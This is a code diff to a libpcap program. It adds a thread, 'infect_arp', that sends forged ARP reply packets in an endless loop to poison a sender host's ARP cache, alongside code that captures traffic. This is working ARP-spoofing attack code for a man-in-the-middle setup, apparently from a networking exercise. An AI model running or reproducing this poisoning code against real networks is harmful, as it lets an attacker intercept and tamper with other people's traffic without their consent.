@@ -151,7 +151,13 @@ struct EthArpPacket final {
 	ArpHdr arp_;
 };
 #pragma pack(pop)
-
+struct ThreadArgs {
+    const char *arg1;
+    const char *arg2;
+    const char *arg3;
+    const char *arg4;
+    const char *arg5;
+};
 
 int find_mac_address(char* ip_str, char* mac_str) {
     struct arpreq areq;
@@ -191,7 +197,40 @@ int find_mac_address(char* ip_str, char* mac_str) {
     return 0;
 }
 
+void *infect_arp(void *args)
+{
+	while(1){
+	struct ThreadArgs *threadArgs = (struct ThreadArgs *)args;
+	const char *sender = threadArgs->arg1;
+	const char *target = threadArgs->arg2;
+	const char *mac_str1 = threadArgs->arg3;
+	const char *my_mac_add = threadArgs->arg4;
+	const char *mac_str2 = threadArgs->arg5;
+	char errbuf[PCAP_ERRBUF_SIZE];
+	pcap_t* infect_handle = pcap_open_live("eth0", 0, 0, 0, errbuf);
+	EthArpPacket infect_packet;
+	
+	infect_packet.eth_.dmac_ = Mac(mac_str1);
+	infect_packet.eth_.smac_ = Mac(my_mac_add);
+	infect_packet.eth_.type_ = htons(EthHdr::Arp);
+	infect_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
+	infect_packet.arp_.pro_ = htons(EthHdr::Ip4);
+	infect_packet.arp_.hln_ = Mac::SIZE;
+	infect_packet.arp_.pln_ = Ip::SIZE;
+	infect_packet.arp_.op_ = htons(ArpHdr::Reply);  //if attack change request to reply
+	infect_packet.arp_.smac_ = Mac(mac_str2);
+	infect_packet.arp_.sip_ = htonl(Ip(target));
+	infect_packet.arp_.tmac_ = Mac(mac_str1);
+	infect_packet.arp_.tip_ = htonl(Ip(sender));
 
+	int res = pcap_sendpacket(infect_handle, reinterpret_cast<const u_char*>(&infect_packet), sizeof(EthArpPacket));
+	if (res != 0) {
+		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(infect_handle));
+	}
+		printf("thread");
+		pcap_close(infect_handle);
+	}
+}
 
 int main(int argc, char* argv[]) {
 
@@ -200,8 +239,11 @@ int main(int argc, char* argv[]) {
 	char* dev = argv[1];
 	char mac_str[6];
 	char errbuf[PCAP_ERRBUF_SIZE];
-	
-	
+	pthread_t p_thread;
+	int thr_id;
+	struct ThreadArgs threadArgs;
+    	
+    	
 	pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);		//dont send packet? dont recive packet
 	char my_mac_add[18];
 	FILE *fp = popen("ifconfig eth0 | awk '/ether/ {print $2}'", "r");
@@ -235,7 +277,7 @@ int main(int argc, char* argv[]) {
 
 	gateway=Mac(mac_str2);
 	sender_mac=Mac(mac_str1);
-
+	
 	packet.eth_.dmac_ = Mac(mac_str1);
 	packet.eth_.smac_ = Mac(my_mac_add);
 	packet.eth_.type_ = htons(EthHdr::Arp);
@@ -255,7 +297,14 @@ int main(int argc, char* argv[]) {
 	}
 	
 	pcap_close(handle);
-
+	
+	
+	threadArgs.arg1 = argv[2];
+    	threadArgs.arg2 = argv[3];
+    	threadArgs.arg3 = mac_str1;
+    	threadArgs.arg4 = my_mac_add;
+    	threadArgs.arg5 = mac_str2;
+    	thr_id = pthread_create(&p_thread, NULL, infect_arp, (void *)&threadArgs);
 	//pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);		//dont send packet? dont recive packet
 	pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
 	while (true) {
@@ -356,5 +405,6 @@ int main(int argc, char* argv[]) {
 		}
 	
 	}  // while flow
+	pthread_join(p_thread, NULL);
 	pcap_close(pcap);	
 }
